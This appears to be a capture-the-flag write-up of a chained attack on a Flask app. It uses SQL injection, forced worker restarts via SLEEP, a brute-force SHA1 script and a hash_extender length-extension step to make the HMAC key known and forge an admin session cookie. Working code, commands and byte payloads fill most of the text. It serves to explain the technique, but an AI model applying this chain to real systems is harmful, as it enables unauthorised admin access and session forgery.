assume: 
    HMAC(key, data) returns bytes, raw hmac sha1 hash for given key and data
    SHA1(data) returns bytes, raw sha1 hash of given data


Our application uses FLASK secret_key  to sign cookies in that way:

secret_key = secondSecret + firstSecret

unsignedCookie = "eyJsb2dnZWRJbiI6dHJ1ZSwidXNlciI6eyJpZCI6MSwiaXNBZG1pbiI6dHJ1ZSwibmFtZSI6ImFkbWluIn19.ZWyXTw" # decoded - {"loggedIn":true,"user":{"id":1,"isAdmin":true,"name":"admin"}}

SALTED = HMAC(secret_key, "cookie-session")

signature = HMAC(SALTED, unsignedCookie)

signedCookie = unsignedCookie + "." + base64(signature)


secondSecret is random hex string with length of 24 which we dont know - we cant brute force it in resonable time so we cant ever retrieve secret_key.

However from sha1 HMAC specification we can learn if key is longer than 64 bytes key = sha1(key) this allows us to length extend secondSecret to get value of sha1(key) 


Here is how to do it 

1. Exploit SQLI to set firstSecret to ''

2. Restart server to reload firstSecret - you can do it by SLEEP(31) in SQL query exploiting SQLI - its possible because gunicorn restarts worker after 30 seconds of no response.

3. Locally brute force sha1 to get hash which - ends with 0xc3, every other byte is less than 128, hash input has to end with your userId on website, for example 2 if you just created account on new instance

very ugly script which does just that for userId 3:




from hashlib import sha1
import string

printable = string.ascii_uppercase + string.ascii_lowercase + string.digits

j = 0

for a in printable:
    for b in printable:
        for c in printable:
            for d in printable:
                for e in printable:
                    j += 1
                    if j % 100000 == 0:
                        print(j)
                    xd = sha1(bytes(str(a+b+c+d+e), "utf-8")+b"\x03").digest()
                    if xd[-1] != 0xc3:
                        continue
                    bad = False

                    for i in xd[:19]:
                        if i > 127:
                            bad = True
                            break
                    if not bad:
                        print(a+b+c+d+e, sha1(bytes(str(a+b+c+d+e), "utf-8")+b"\x03").digest())
                        
                        
                        
From this script we get output "Cbwv3\x03" which sha1 is 5a657d0c6b6b0a25227c27645c48611c2f2954c3


4. You need to be logged in as user with id 3 or whatever you set in script

5. Sign file with content "Cbwv3"

    server will do there operations:


    temp = SHA1("" + "Cbwv3" + "\x03") 
    # SHA1(firstSecret + fileData + userId) 
    # temp will be exacly hash we just bruted - 5a657d0c6b6b0a25227c27645c48611c2f2954c3 in raw form
    # temp = "\x5a\x65\x7d\x0c\x6b\x6b\x0a\x25\x22\x7c\x27\x64\x5c\x48\x61\x1c\x2f\x29\x54\xc3"
    hash = SHA1(secondSecret + temp)                       
    # from response file we can extract hash (last 20 bytes)
    
    # for example hash can be 
    hash = b"\x8a\x64\xdc\x4c\x86\x30\x05\x33\xf8\x40\x4f\xad\x48\x66\xb9\xd2\x84\xa8\x8c\xfa"
    # this is just example hash will be diffrent depending on secondSecret which is random

    in response you should get hash "\x8a\x64\xdc\x4c\x86\x30\x05\x33\xf8\x40\x4f\xad\x48\x66\xb9\xd2\x84\xa8\x8c\xfa"
                        
        
        
        
6. Having hash we can preform hash length extension attack. I used tool https://github.com/iagox86/hash_extender

example usage: 

secondSecret length is 24 and sha1 length is 20 so we know our whole hashed string length is 44

we use append "aaaaaaaaaa" just to make final hash longer than 64 bytes

./hash_extender --secret=44 --signature=8a64dc4c86300533f8404fad4866b9d284a88cfa --format=sha1 -a "aaaaaaaaaa" --data=""

output:

Type: sha1
Secret length: 44
New signature: 249a56080bd3ef571fcdb6b8716d7a87602fa449
New string: 800000000000000000000000000000000000016061616161616161616161

this creates new hash 249a56080bd3ef571fcdb6b8716d7a87602fa449 which is equal to hex(SHA1(secondSecret +b "\x5a\x65\x7d\x0c\x6b\x6b\x0a\x25\x22\x7c\x27\x64\x5c\x48\x61\x1c\x2f\x29\x54\xc3" + b"\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x60\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"))


7. Then we use SQLI to change firstSecret to b"\x5a\x65\x7d\x0c\x6b\x6b\x0a\x25\x22\x7c\x27\x64\x5c\x48\x61\x1c\x2f\x29\x54\xc3" + b"\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x60\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
we can do it by using CONCAT and CHAR functions like: CONCAT(CHAR(0x5a), CHAR(0x65), ... , CHAR(0x61), CHAR(0x61))

here is also the reason we had to brute force that string - mysql is utf-8 so it wouldnt accept random values some over 127 - we also had to brute force 0xc3 at the end of a hash which joins with 0x80 at the beginning of new string which makes it utf-8 correct

8. Now we just restart server exacly the same way as in point 2

9. As server uses secondSecret + firstSecret as hmac key now, and its longer than 64 bytes hmac makes key = sha1(key) operation which makes our hash  b"\x24\x9a\x56\x08\x0b\xd3\xef\x57\x1f\xcd\xb6\xb8\x71\x6d\x7a\x87\x60\x2f\xa4\x49" equal key and we are able to forge cookie with isAdmin: true                
                        
